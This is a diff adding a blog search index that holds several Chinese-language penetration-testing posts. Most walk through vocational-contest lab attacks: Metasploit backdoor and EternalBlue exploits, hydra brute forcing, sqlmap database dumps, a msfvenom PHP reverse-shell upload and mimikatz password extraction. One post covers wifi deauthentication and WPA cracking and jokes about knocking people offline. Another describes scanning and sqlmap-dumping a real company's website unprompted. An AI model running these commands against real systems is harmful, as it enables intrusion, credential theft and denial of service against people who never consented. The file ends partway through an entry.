@@ -1,0 +1,241 @@
+<?xml version="1.0" encoding="utf-8"?>
+<search> 
+  
+  
+    
+    <entry>
+      <title>wifi断网和wifi密码破解</title>
+      <link href="2021/06/28/wifi%E6%96%AD%E7%BD%91%E5%92%8Cwifi%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/"/>
+      <url>2021/06/28/wifi%E6%96%AD%E7%BD%91%E5%92%8Cwifi%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/</url>
+      
+        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><strong>利用工具 Aircrack-ng<br>kali是自带/win版本百度吧<br>需要一个免驱的网卡<br>连接上网络,随便一个网络都可以</strong><br><img src="img.png" alt="img.png"><br><strong>输入ifconfig  查看一下网卡设备。 网卡为wlan0</strong><br><img src="img_1.png" alt="img_1.png"><br><strong>输入: airmon-ng   查看是否支持监听</strong><br><img src="img_2.png" alt="img_2.png"><br><strong>出现wlan0 就可以进行监听<br>airmon-ng start wlan0   开启无线网卡监控</strong><br><img src="img_3.png" alt="img_3.png"><br>输入ifconfig  网卡的设备变为wlan0mon<br><img src="img_4.png" alt="img_4.png"><br><strong>已经开启了监听模式<br>airodump-wlan0mon  查看周围的wifi网络</strong><br><img src="img_5.png" alt="img_5.png"><br><strong>出现周围的网络<br>这次实验目标为MRFZ<br>进行监听MRFZ网络信息<br>airodump-ng -c 6 –bssid 00:03:0F:C0:BD:D0 -w 6 wlan0mon<br>-c 指定频道号也就是CH<br>–bssid 指定路由器bssid  也就是BSSID<br>-w 指定抓取的数据包保存位置</strong><br><img src="img_6.png" alt="img_6.png"><br><strong>获取了一些MAC地址<br>04:8C:9A:E2:E2:B2  是我手机连接MRFZ的MAC</strong><br><img src="img_7.png" alt="img_7.png"><br><strong>输入aireplay-ng -0 50 -a 00:03:0F:BD:D0 -c 04:8C:9A:E2:E2:B2 wlan0mon<br>-0 表示发起 deauthentication攻击<br>50  好比50个包<br>-a 指定无线路由器BSSID<br>-c 指定强行断开的设备<br>输入命令后进行断网 我的手机也直接断网</strong><br><img src="img_8.png" alt="img_8.png"><br><img src="img_9.png" alt="img_9.png"><br><strong>输入aircrack-ng -a2 -b 00:03:0F:C0:BD:D0 -w 7 6-01.cap<br>-a2 代表WPA的握手包<br>-b 指定路由器BSSID<br>-w 指定字典  7位字典名称<br>6-01.cap 为上面监听MRFZ网络信息设置抓取的数据包保存的位置</strong><br><img src="8.png"><br><img src="img_10.png" alt="img_10.png"><br><strong>破解出密码为2020Network<br>密码破解需要靠强大的字典来破解<br>没有什么好玩的,好玩的也就是断网<br>断网的可以发送很多个类似数据包的   可以让联网的人一直断网,注意一点小心别人打你</strong></p>]]></content>
+      
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>一次挖洞的经历</title>
+      <link href="2021/06/04/%E4%B8%80%E6%AC%A1%E6%8C%96%E6%B4%9E%E7%9A%84%E7%BB%8F%E5%8E%86/"/>
+      <url>2021/06/04/%E4%B8%80%E6%AC%A1%E6%8C%96%E6%B4%9E%E7%9A%84%E7%BB%8F%E5%8E%86/</url>
+      
+        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><strong>找到了一个企业的网站,就是闲的无聊, 利用工具Acunetix工具扫描了一下,结果还真扫描出漏洞了</strong><br><img src="1.png"><br><strong>扫描得出含有sql注入</strong></p><p><img src="2.png"><br><strong>进入这个页面看到了含有一个搜索框</strong><br><strong>输入1显示正常<br>输入1’  显示报错</strong><br><img src="3.png"><br><strong>显示出来了sql语法错误,说明含有sql注入<br>手工注入不出东西当我要放弃的时候,一个老哥告诉我用sqlmap跑一下<br>我就试了一下,结果还不错,跑出来东西了<br>在终端输入sqlmap -u “<a href="https://www.xxx.com/cloud/trial?softname=1&quot;">https://www.xxx.com/cloud/trial?softname=1&quot;</a> –dbs</strong><br><img src="4.png"><br><strong>sqlmap -u “<a href="https://www.xxx.com/cloud/trial?softname=1&quot;">https://www.xxx.com/cloud/trial?softname=1&quot;</a> -D … —tables<br>sqlmap -u “<a href="https://www.xxx.com/cloud/trial?softname=1&quot;">https://www.xxx.com/cloud/trial?softname=1&quot;</a> -D … -T –dump<br>一个一个跑表就可以了获取了很多信息<br>只不过跑了很久还是没有跑出账号和密码<br>算了,太累了,提交了<br>提交的道路永远是那么多坑</strong><br><img src="5.png"><br><strong>提交了2次,还好过了</strong><br><img src="6.png"><br><strong>哎,还是太菜了,不过还好,第一次挖到的</strong></p>]]></content>
+      
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>中职网络安全攻防(3)</title>
+      <link href="2021/05/18/%E4%B8%AD%E8%81%8C%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2-3/"/>
+      <url>2021/05/18/%E4%B8%AD%E8%81%8C%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2-3/</url>
+      
+        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><strong>攻击的话跟第一部分一样,可以采用<br><a href="https://yueyuelovexingxing.github.io/2021/05/18/%E4%B8%AD%E8%81%8C%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E9%98%B6%E6%AE%B5/">https://yueyuelovexingxing.github.io/2021/05/18/%E4%B8%AD%E8%81%8C%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E9%98%B6%E6%AE%B5/</a></strong><br><strong>第三部分   攻击</strong><br><strong>接着上面的<a href="https://yueyuelovexingxing.github.io/2021/05/18/%E4%B8%AD%E8%81%8C%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2-2/">https://yueyuelovexingxing.github.io/2021/05/18/%E4%B8%AD%E8%81%8C%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2-2/</a></strong></p><p><strong>已经加固好了<br>攻击别人的靶机<br>先nmap -sP 192.168.32.0/24  扫描一下<br>扫描192.168.32.0/24网段</strong><br><strong>看有哪些ip</strong><br><img src="1.png"><br><strong>然后在nmap –script=vuln 192.168.32.131<br>扫描一下 192.168.32.131  里面的漏洞 。  时间比较长</strong><br><img src="2.png"><br><strong>找开放的服务进行攻击,找漏洞进行攻击<br>方法很多,由于我太菜不会<br>我这里用vsftpd_234_backdoor 这个漏洞进行攻击<br>use exploit/ftp/vsftpd_234_backdoor<br>show options   查看配置<br>set rhost 192.168.32.131    设置靶机ip地址<br>run</strong><br><img src="3.png"><br><strong>输入passwd root修改密码<br>修改为123456</strong><br><img src="4.png"><br><strong>利用ssh进行连接<br>ssh 192.168.32.131</strong><br><img src="5.png"><br><strong>输入dir 查看一下  有一个flag的文件夹<br>cd flag   进入flag文件夹<br>dir   查看flag里面的文件 。  里面有一个flag.txt的文本<br>cat flag.txt     查看flag.txt的内容<br>出来falg为<br>roottoor741</strong><br><img src="6.png"><br><strong>其实只要加固好,只要不用脚本等什么东西。是攻击不进来的</strong></p>]]></content>
+      
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>中职网络安全攻防(2)</title>
+      <link href="2021/05/18/%E4%B8%AD%E8%81%8C%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2-2/"/>
+      <url>2021/05/18/%E4%B8%AD%E8%81%8C%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2-2/</url>
+      
+        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><strong>第二部分加固<br>接着上篇文章<a href="https://yueyuelovexingxing.github.io/2021/05/18/%E4%B8%AD%E8%81%8C%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E9%98%B6%E6%AE%B5/">https://yueyuelovexingxing.github.io/2021/05/18/%E4%B8%AD%E8%81%8C%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E9%98%B6%E6%AE%B5/</a></strong></p><p><strong>已经用ssh远程连接上靶机了<br>修改root密码为强密码<br>passwd root<br>修改密码为741852963</strong><br><img src="2.png"><br><strong>删除多余的用户</strong><br><img src="3.png"><br><strong>userdel user</strong><br><img src="4.png"><br><strong>删除user</strong></p><p><strong>加固21端口<br>配置文件<br>vim /etc/vsftpd.conf<br>把anoymous_enable=YES      把YES改为NO<br>保存退出   按Esc   然后在:wq</strong><br><img src="1.png"><br><strong>加固22端口   ssh限制次数<br>配置文件<br>vim /etc/ssh/sshd_config<br>禁止root登陆<br>PermitRootLogin yes   把yes改为no<br>保存退出  按Esc  然后在:wq</strong><br><img src="5.png"><br><strong>加固3306端口<br>进入mysql里面  。  一般来说mysql是没有密码的  。   如果有就进行爆破<br>use mysql    进入mysql数据库<br>select user,host,password from user;           查询数据库用户,地址,密码<br>update user set host=’localhost’where user=’root’;   设置root只能本地登陆<br>select user,host,password from user;            查询数据库用户,地址,密码</strong><br><img src="6.png"><br><strong>如果有多余的用户删除了  我这里没有多余的  自己新建了一个用户<br>输入<br>create user ‘test’@’localhost’ indentified by ‘123456’;        新建一个test为本地登陆 密码为123456<br>select user,host,password from user;          查看数据库用户,地址,密码</strong><br><img src="7.png"><br><strong>drop user ‘test’@’localhost’;    删除test用户</strong><br><img src="9.png"><br><strong>select user,host,password from user;    查看数据库用户,地址,密码</strong><br><img src="8.png"><br><strong>输入flush privileges;    清除一下缓存</strong><br><img src="10.png"></p><p><strong>这些只是加固端口的 可以直接删除命令<br>删除cat    more    head       都是查看的意思<br>别问为什么删    问就是百度这是什么意思<br>type cat  查看cat的路径<br>rm /bin/cat  删除cat</strong><br><img src="11.png"><br><strong>type more   查看more的路径<br>rm /bin/more    删除more</strong><br><img src="12.png"><br><strong>type head   查看head的路径<br>rm /usr/bin/head    删除head</strong><br><img src="13.png"></p><p><strong>加固好了</strong></p>]]></content>
+      
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>中职网络安全攻防阶段</title>
+      <link href="2021/05/18/%E4%B8%AD%E8%81%8C%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E9%98%B6%E6%AE%B5/"/>
+      <url>2021/05/18/%E4%B8%AD%E8%81%8C%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E9%98%B6%E6%AE%B5/</url>
+      
+        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><strong>由于这是我自己弄的靶机  没有别人 跟正常的第二阶段有很大区别</strong><br><strong>分为三部分   自己感觉<br>第一部分:先攻击进自己的靶机<br>第二部分:再对自己的靶机进行各种加固<br>第三部分:进攻别的人靶机获取flag</strong></p><p><strong>第一部分</strong><br><strong>1.先nmap 扫描一下   扫描出来了21,22,23,53,80等等服务</strong><br><img src="1.png"><br><strong>2.(1)利用21端口ftp,进行攻击<br>终端输入msfconsole<br>利用exploit/unix/ftp/vsftpd_234_backdoor</strong><br><img src="2.png"><br><strong>设置参数<br>show options<br>set rhost 192.168.32.131<br>set lport 21<br>run</strong><br><img src="3.png"><br><strong>输入passwd root   设置root密码为root</strong><br><img src="4.png"><br><strong>(2)ssh弱口令,进行爆破  22端口<br>输入hydra -l root -P 5.txt ssh://192.168.32.131<br>5.txt是我自己弄的密码字典<br>-l 是用户的意思<br>-P 是密码字典的意思<br>ssh 是指ssh端口<br>192.168.32.131 是我自己的靶机ip<br>爆破出密码是root</strong><br><img src="5.png"><br><strong>(3)telnet端口,进行爆破. 23端口    跟ssh端口差不多都是hydra进行爆破<br>输入hydra -l root -P 5.txt telnet://192.168.32.131<br>telnet 是指telnet端口  剩下的配置都跟上面的一样</strong><br><img src="6.png"><br><strong>(4)netbios-ssn :139和445端口     进行攻击<br>利用只支持samba 3.X - 4.X</strong><br><img src="7.png"><br><strong>利用msf攻击<br>利用use multi/samba/usermap_script</strong><br><img src="8.png"><br><strong>设置配置<br>输入set payload cmd/unix/bind_netcat<br>set rhost 192.168.32.131<br>run</strong><br><img src="9.png"><br><strong>(5)java-rmi端口   1099端口<br>利用use explout/unix/misc/distcc_exec<br>set rhost 192.168.32.131<br>run</strong><br><img src="10.png"><br><strong>(6) mysql数据库爆破   3306<br>输入hydra -l root -P 5.txt mysql://192.168.32.131<br>mysql为mysql端口   数据库密码为123456</strong><br><img src="20.png"><br><strong>(7)irc端口漏洞    6667端口<br>设置参数<br>利用use exploit/unix/irc/unreal_ircd_3281_backdoor<br>set rhost 192.168.32.131<br>run</strong><br><img src="11.png"><br><strong>犹豫我太菜也只会这些漏洞利用<br>我这里是利用 为了ssh需要跑字典<br>就直接利用 vsftpd_234_backdoor漏洞进行修改密码</strong><br><img src="12.png"><br><strong>ssh 192.168.32.131<br><a href="mailto:&#x72;&#111;&#x6f;&#116;&#64;&#49;&#x39;&#50;&#x2e;&#49;&#x36;&#56;&#46;&#51;&#50;&#46;&#49;&#51;&#x31;">&#x72;&#111;&#x6f;&#116;&#64;&#49;&#x39;&#50;&#x2e;&#49;&#x36;&#56;&#46;&#51;&#50;&#46;&#49;&#51;&#x31;</a>‘s password:   (输入密码)</strong><br><img src="13.png"><br><strong>现在已经攻击进自己的靶机</strong></p>]]></content>
+      
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>sql注入靶机</title>
+      <link href="2021/04/26/sql%E6%B3%A8%E5%85%A5%E9%9D%B6%E6%9C%BA/"/>
+      <url>2021/04/26/sql%E6%B3%A8%E5%85%A5%E9%9D%B6%E6%9C%BA/</url>
+      
+        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><strong>需要靶机的可以加我qq</strong></p><p><strong>kali  ip:192.168.32.144<br>靶机   ip：192.168.32.145</strong></p><p><strong>开始</strong></p><p><strong>首先用nmap 扫描一下  扫描出来开启22端口和80端口<br>开启80端口说明可以访问网页</strong><br><img src="1.png"></p><p><strong>在浏览器上输入192.168.32.145<br>192.168.32.145为我靶机ip<br>得出以下页面</strong><br><img src="2.png"><br><strong>然后点击Admin</strong><br><img src="3.png"><br><strong>得到了登陆页面</strong><br><img src="4.png"><br><strong>看了很多大佬都用这个,然后自己也安装了一个,  用了用感觉真不错<br>OWASP ZAP</strong><br><img src="5.png"><br><strong>点击Automated Scan</strong><br><img src="6.png"><br><strong>会出来下面的页面<br>在http:// 后面输入靶机ip就行</strong><br><img src="7.png"><br><strong>点击攻击即可</strong><br><img src="8.png"><br><strong>点击警报 警报出了15处漏洞<br>含有sql注入漏洞</strong><br><img src="9.png"></p><p><strong>然后到kali里面利用sqlmap工具进行注入漏洞<br>在终端输入sqlmap -u “<a href="http://192.168.32.145/cat.php?id=1&quot;">http://192.168.32.145/cat.php?id=1&quot;</a> –batch –dbs ：查看数据库</strong><br>   #- - batch  - - dbs 有两个杠<br><strong>得到这两个信息<br>[<em>] information_schema<br>[</em>] photoblog</strong></p><p><img src="10.png"><br><strong>输入sqlmap -u “<a href="http://192.168.32.145/cat.php?id=1&quot;">http://192.168.32.145/cat.php?id=1&quot;</a> –batch –D photoblog –table<br>查看photoblog数据库下面的用户<br>得到<br>+————+<br>| categories |<br>| pictures   |<br>| users      |<br>+————+</strong><br>三个用户<br><img src="11.png"><br><strong>输入sqlmap -u “<a href="http://192.168.32.145/cat.php?id=1&quot;">http://192.168.32.145/cat.php?id=1&quot;</a> –batch -D photoblog -T users –dump<br>查看photoblog数据库里的users里面的用户加密码<br>得到<br>+—-+——-+———————————————+<br>| id | login | password                                    |<br>+—-+——-+———————————————+<br>| 1  | admin | 8efe310f9ab3efeae8d410a8e0166eb2 (P4ssw0rd) |<br>+—-+——-+———————————————+<br>用户为admin<br>密码为P4ssw0rd</strong><br><img src="12.png"></p><p><strong>进入网页登陆 登陆进去为这样</strong></p><p><img src="13.png"><br><strong>点击一下这个  Add a new picture</strong><br><img src="14.png"></p><p><strong>会有一个上传文件的网页</strong><br><img src="15.png"></p><p><strong>利用msf生成php木马文件<br>输入msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.32.144 lport=4444 -f raw &gt;shell.php</strong><br><img src="16.png"><br><img src="17.png"><br><strong>生成木马文件完成后<br>输入msfconsole ,进入框架<br>输入use exploit/multi/handler   #利用模块<br>输入 set payload php/meterpreter/reverse_tcp  #设置php文件反弹<br>输入set lhost 192.168.32.144    #设置反弹回到的主机ip</strong></p><p><img src="18.png"></p><p><strong>然后把文件上传到网页的选择文件</strong><br><img src="19.png"><br><strong>然后不知道为什么不管用<br>然后我百度一下php上传被限制  需要改成PHP<br>然后有改成PHP<br>上传成功后 页面为</strong><br><img src="20.png"><br><strong>点击shell就行<br>回到kali   就进入了meterpreter里面了</strong></p><p><img src="21.png"></p>]]></content>
+      
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>中职网络安全  linux操作系统加固</title>
+      <link href="2021/04/16/%E4%B8%AD%E8%81%8C%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8-linux%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%8A%A0%E5%9B%BA/"/>
+      <url>2021/04/16/%E4%B8%AD%E8%81%8C%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8-linux%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%8A%A0%E5%9B%BA/</url>
+      
+        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><strong>开场白：<br>今天没有刷什么视频也没有什么灵感<br>每个人都很难,不止你一个人难.每个人都很累,不止你一个人累.<br>在这里祝我所有的好兄弟们,不管是上学的还是不上学的<br>愿每个人都可以让生活善待,愿每个人都别沉醉在现在的美好生活中<br>以前听过一句话<br>年纪轻轻的,别懒散,别颓废,该干啥干啥,忙起来,别闲着</strong></p><p><strong>Linux 操作系统加固</strong></p><p><strong>任务环境说明：</strong><br>    <strong>服务器场景：PYsystem20193（用户名：root；密码：123456）</strong><br>    <strong>服务器场景操作系统：PYsystem20193（版本不详）</strong></p><p><strong>1.通过本地PC中渗透测试平台Kali2.0中的metasploit渗透测试平台对服务器场景PYsystem20193进行Telnet密码暴力破解渗透测试，用户名admin，</strong><br><strong>密码字典使用/root/2.txt，并将破解成功的密码作为Flag值提交；</strong></p><p><strong>输入msfconsole    启动msf</strong><br><strong>输入search telnet telnet_login</strong><br><img src="1.png"><br><strong>得到auxiliary/scanner/telnet/telnet_login</strong><br><strong>输入use auxiliary/scanner/telnet/telnet_login    进行利用模块</strong><br><strong>输入show options     查看一下需要的配置</strong><br><img src="2.png"><br><strong>输入set rhost 192.168.32.131         设置靶机ip     #192.168.32.131 为我自己靶机的ip</strong><br><strong>输入set PASS_FILE 8.txt           设置密码字典     #8.txt  字典是我自己写的</strong><br><strong>输入set USER_FILE 8.txt        设置用户字典          #我这里是密码字典和用户字典为一个字典  就是闲麻烦  :)</strong><br><strong>输入show options     查看一下设置成功是否</strong><br><img src="3.png"><br><strong>输入run      爆出出用户密码为msfadmin,msfadmin</strong><br><strong>flag:msfadmin,msfadmin</strong><br><img src="4.png"><br><strong>2.通过本地PC中渗透测试平台Kali2.0中的metasploit渗透测试平台对服务器场景PYsystem20193进行Telnet密码暴力破解渗透测试，并使用Wireshark</strong><br><strong>进行抓包，找到包含正确密码的数据包中的data信息，并将Data:后的字符串作为Flag值提交；（11分）</strong><br><strong>打开Wireshark</strong><br><img src="5.png"><br><strong>选择eth0    进行抓取     #eth0是指以太网</strong><br><img src="6.png"><br><strong>回到上面的那个页面进行run</strong><br><img src="7.png"><br><strong>回到Wireshark的页面</strong><br><strong>输入过滤命令  ip.addr==192.168.32.131 and telnet  #意思是过滤192.168.32.131的telnet的端口的信息</strong><br><img src="8.png"><br><strong>一段一段找   我这里是使用过滤命令找   tcp.stream eq 2    #2的意思是正确的密码在我的第二段</strong><br><strong><img src="9.png"></strong><br><strong>Data 后面为msfadmin\r\n</strong><br><strong>flag:msfadmin\r\n</strong></p><p><strong>3.对服务器场景PYsystem20193的Telnet服务进行加固，要求修改其配置文件的第12行禁用Telnet服务，将需要加固的配置文件路径作为Flag值提交；</strong><br><strong>telnet密码已经爆破出来了  直接输入用户和密码 登陆就行</strong><br><strong>输入telnet 192.168.32.131</strong><br><img src="10.png"><br><strong>登陆完成之后不知道为什么没有找到telnet的配置文件</strong><br><strong>这就很尴尬,又去了别的Centos 7 上面找了一下也没有</strong><br><strong>于是就在网上找了一下里面的内容</strong><br><strong>修改文件disable=no    把yes给我no   就可以了</strong><br><strong>flag: /etc/xinetd.d/telnet</strong><br><img src="11.png"></p><p><strong>4.对服务器场景PYsystem20193的Telnet服务加固后，打开本地PC中渗透测试平台Kali2.0的终端，使用Telnet命令并再次使用admin账户进行登录，</strong><br><strong>此时应该提示登录失败，将登录失败提示的倒数第一行的最后两个单词作为Flag值(单词之间以英文逗号分隔，例如A,B) 提交；</strong><br><strong>在终端输入telent 192.168.32.131    再次进行连接</strong><br><strong>连接不上了</strong><br><strong>flag:to host</strong><br><img src="12.png"></p><p><strong>5.通过本地PC中渗透测试平台Kali2.0对服务器场景PYsystem20193进行FTP弱口令渗透测试，使用匿名用户来登录，并将FTP服务的根目录下唯一一</strong><br><strong>个后缀为.txt的文档内容作为Flag值提交；</strong><br><strong>终端输入ftp 192.168.32.131   进行ftp连接</strong><br><strong>在Name (192.168.32.131:root):    后面添加root:)<br>在Password:123      后面随便输入一个密码都行<br>完成之后会自动给你开启一个6200端口</strong><br><img src="13.png"><br><strong>然后在开启一个终端输入nc 192.168.32.131 6200<br>nc 进行连接 6200端口</strong><br><img src="14.png"><br><strong>dir 查看一下<br>cd /etc    进入etc里面</strong><br><strong>dir  查看一下  得出txt格式的文本名为1.txt</strong><br><strong>flag:1.txt</strong><br><img src="15.png"><br><strong>6.对服务器场景PYsystem20193的FTP服务进行加固，要求修改其配置文件的第十二行，设置禁止FTP匿名用户登录，将需要加固的配置文件路径作为Flag值提交；</strong></p><p><strong>输入vim /etc/vsftpd.conf</strong><br><strong>anonymous_enable=YES    把YES改为NO就可以了</strong></p><p><img src="16.png"></p><p><strong>7.对服务器场景PYsystem20193的FTP服务进行加固后，打开本地PC中渗透测试平台Kali2.0的终端，使用FTP命令并且使用匿名用户来登录FTP服务器，<br>将登录失败提示的倒数第二行的最后一个单词作为Flag值(单词之间以英文逗号分隔，例如A,B) 提交；<br>在终端输入ftp 192.168.32.131   进行连接   ,连接失败<br>flag:disabled</strong><br><img src="17.png"></p><p><strong>8.通过本地PC中渗透测试平台Kali2.0对服务器场景PYsystem20193，进行Mysql数据库密码暴力破解渗透测试，使用/root/2.txt下的字典文件破解数据库<br>root用户的密码，并将该数据库root用户的密码作为Flag值提交；<br>我这里是用hydra  #名为九头蛇<br>输入hydra -l root -P 8.txt -t 5 -V 192.168.32.131 mysql<br>-l:指定用户<br>-P:指定密码字典<br>-t:为速度<br>-V：显示出爆破的过程<br>8.txt:是我自己弄的字典<br>mysql:对mysql服务进行爆破  爆破出的密码为123456</strong><br><strong>flag:123456</strong><br><img src="18.png"></p><p><strong>9.对服务器场景PYsystem20193的Mysql数据库用户进行加固，使用delete命令将任意地点登录的mysql用户删除，并使用select命令查询现有的mysql用户，<br>将查询到的最后一个用户名作为Flag值提交。</strong><br><strong>mysql -h 192.168.32.131 -uroot -p123456</strong><br><strong>输入命令进行远程连接</strong><br><img src="19.png"><br><strong>输入select user,host,password from user;</strong><br><strong>查看用户及其权限</strong><br><img src="20.png"><br><strong>输入delete from mysql.user where user=’root’;  删除mysql里面的 user里面的root用户</strong><br><strong>输入select user,host,password from user;   查看用户及其权限</strong><br><img src="21.png"></p>]]></content>
+      
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>中职网络安全 windows渗透</title>
+      <link href="2021/04/15/%E4%B8%AD%E8%81%8C%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8-windows%E6%B8%97%E9%80%8F/"/>
+      <url>2021/04/15/%E4%B8%AD%E8%81%8C%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8-windows%E6%B8%97%E9%80%8F/</url>
+      
+        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><strong>如果我赶不上早上五点的太阳,那我也不想去看傍晚六点的夕阳了</strong><br><strong>意思是说,除了你谁我都不想要</strong></p><p><strong>Windows操作系统渗透测试</strong></p><p><strong>服务器场景：PYsystem20194</strong><br><strong>服务器场景操作系统：Windows（版本不详）</strong></p><p><strong>没有原资料  仅供查考</strong></p><p><strong>1.通过本地PC中渗透测试平台Kali2.0对服务器场景PYsystem20194进行系统服务及版本扫描渗透测试， 并将该操作显示结果中445</strong><br><strong>端口对应的服务版本信息字符串作为Flag值提交</strong>；<br><strong>输入:nmap -sV -p445 192.168.32.132         #192.168.32.132为我靶机的ip</strong><br><strong>flag:Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)</strong><br><img src="1.png"></p><p><strong>2.通过本地PC中渗透测试平台Kali2.0对服务器场景PYsystem20194进行渗透测试，将该场景网络连接信息中的DNS信息作为Flag值</strong><br><strong>(例如：114.114.114.114) 提交；</strong><br><strong>(1.)输入msfconsole    启动msf服务</strong><br><strong>(2.)输入search ms17_010  查找exploit/windows/smb/ms17_010_eternalblue</strong><br><img src="2.png"><br><strong>(3.)输入use exploit/windows/smb/ms17_010_eternalblue    进行利用模块</strong><br><img src="3.png"><br><strong>(4.)输入show options   查看一下设置</strong><br><img src="4.png"><br><strong>(5.)输入set rhost 192.168.32.132      设置靶机ip</strong><br><strong>输入set payload windows/x64/meterpreter/reverse_tcp  设置反弹效果</strong><br><strong>输入set lhost 192.168.32.135      设置反弹回的ip地址</strong><br><strong>输入show options               查看一下配置完成了吗</strong><br><img src="5.png"><br><strong>输入run</strong><br><img src="6.png"><br><strong>输入shell 进入c盘下</strong><br><img src="7.png"><br><strong>输入ipconfig/all</strong><br><strong>flag:144.144.144.144</strong><br><img src="8.png"><br><strong>3.通过本地PC中渗透测试平台Kali2.0对服务器场景PYsystem20194进行渗透测试，将该场景桌面上111文件夹中唯一一个后缀为.docx文件的文件名称</strong><br><strong>作为Flag值提交；</strong><br><strong><strong>进入cd Desktop    #Desktop为桌面路径</strong><br>dir 查看               flag:flag.docx</strong><br><img src="9.png"></p><p><strong>4.通过本地PC中渗透测试平台Kali2.0对服务器场景PYsystem20194进行渗透测试，将该场景桌面上111文件夹中唯一一个后缀为.docx文件的文档内容作为</strong><br><strong>Flag值提交；</strong><br><strong>接着上题</strong><br><strong>名字找到了</strong><br><strong>输入exit 退出c盘下  进入meterpreter下</strong><br><strong>输入 download C:\Users\Administrator\Desktop\flag.docx     系统会自动给你下载到kali里面</strong><br><strong>download 为下载</strong><br><strong>C:\Users\Administrator\Desktop\flag.docx    flag.docx 的路径</strong><br><img src="10.png"><br><strong>下载下来之后我打开还是不行  后来问了一个大佬说的 在把文件拖到主机里面打开就可以了</strong><br><strong>flag:fyfyti</strong><br><img src="11.png"><br><img src="12.png"><br><img src="13.png"><br><strong>5.通过本地PC中渗透测试平台Kali2.0对服务器场景PYsystem20194进行渗透测试，将该场景桌面上222文件夹中唯一一个图片中的英文单词作为Flag值提交;</strong><br><strong>接着上面的题</strong><br><img src="14.png"><br><strong>输入download C:\Users\Administrator\Desktop\1.jpg     进行下载照片</strong></p><p><img src="15.png"><br><strong>不知道是我照片的问题还是什么问题 在kali里面打不开照片  也就直接拖到主机了</strong><br><img src="16.png"><br><strong>打开为 ABCD</strong><br><img src="17.png" alt="17"><br><strong>6.通过本地PC中渗透测试平台Kali2.0对服务器场景PYsystem20194进行渗透测试，将该场景中的当前最高账户管理员的密码作为Flag值提交;</strong><br><strong>输入getuid   进行启动</strong><br><strong><strong>输入load mimikatz  启动mimikatz模块</strong><br><strong>输入msv 查看用户和密码</strong><br>输入wdigest   破出密码 Administrator 的密码为123456</strong><br><img src="18.png"></p><p><strong>7.通过本地PC中渗透测试平台Kali2.0对服务器场景PYsystem20194进行渗透测试，将该场景中回收站内文件的文档内容作为Flag值提交。<br>在meterpreter下输入</strong><br><strong>输入cd /    进入根目录</strong><br><strong>输入cd $Recycle.Bin   进入一下回收站</strong><br><strong>输入dir       查看一下</strong><br><strong>出现 三个</strong><br><img src="19.png"><br><strong>cd S-1-5-21-2706487821-2887370924-2198568979-500    进入这里面    尴尬的是我忘记清理回收站了</strong><br><img src="20.png"><br><strong>这里就以txt格式的来做吧    文件为flag.txt   flag:sfadsafdsd</strong><br><img src="21.png"></p>]]></content>
+      
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>一定要读的文章</title>
